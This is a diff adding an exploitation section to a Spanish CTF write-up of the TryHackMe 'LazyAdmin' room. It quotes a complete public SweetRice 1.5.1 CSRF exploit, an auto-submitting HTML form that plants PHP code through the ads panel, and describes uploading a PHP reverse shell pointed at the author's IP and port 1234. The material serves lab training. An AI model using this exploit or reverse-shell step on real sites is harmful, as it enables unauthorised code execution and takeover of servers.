@@ -143,4 +143,66 @@ Si buscamos entre los resultados podemos encontrar una línea con el nombre de u
 
 ![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/hash.png)
 
+## Exploitation
+
+#### :collision:Método - 1
+
+
+Como ya obtuvimos qué versión de SweetRice se está empleando podemos comprobar si ésta es vulnerable. Una simple búsqueda en Google nos dará varios resultados:
+
+![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/google.png)
+
+En este método nos centraremos en el tercer enlace, el cual nos detalla el procedimiento a seguir para obtener un Code Execution:
+
+```
+<!--
+# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
+# Date: 30-11-2016
+# Exploit Author: Ashiyane Digital Security Team
+# Vendor Homepage: http://www.basic-cms.org/
+# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
+# Version: 1.5.1
+
+
+# Description :
+
+# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
+PHP Codes In Ads File
+# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
+PHP Codes On Server .
+# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo(); 
+Code You Can
+Customize Exploit For Your Self .
+
+# Exploit :
+-->
+
+<html>
+<body onload="document.exploit.submit();">
+<form action="http://localhost/sweetrice/as/?type=ad&mode=save"
+method="POST" name="exploit">
+<input type="hidden" name="adk" value="hacked"/>
+<textarea type="hidden" name="adv">
+<?php
+echo '<h1> Hacked </h1>';
+phpinfo();?>
+</textarea>
+</form>
+</body>
+</html>
+
+<!--
+# After HTML File Executed You Can Access Page In
+http://localhost/sweetrice/inc/ads/hacked.php
+  -->
+```
+
+Tal y como lo describe necesitamos tener acceso a una cuenta admin del CMS para luego acceder al panel de ads.Una vez ahí subir el codigo que nos dará una reverse shell. En mi caso utilicé `/usr/share/webshells/php/php-reverse-shell.php` cambiando los parámetros de la IP con mi dirección y el puerto por el 1234.
+
+
+
+
+
+
+
 
